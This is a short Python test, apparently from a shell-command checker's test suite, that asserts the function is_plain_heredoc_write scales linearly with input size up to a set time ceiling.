def test_checking_a_plain_heredoc_write_is_linear(make):
    scales_linearly(is_plain_heredoc_write, make, 2_000, ceiling=20.0)
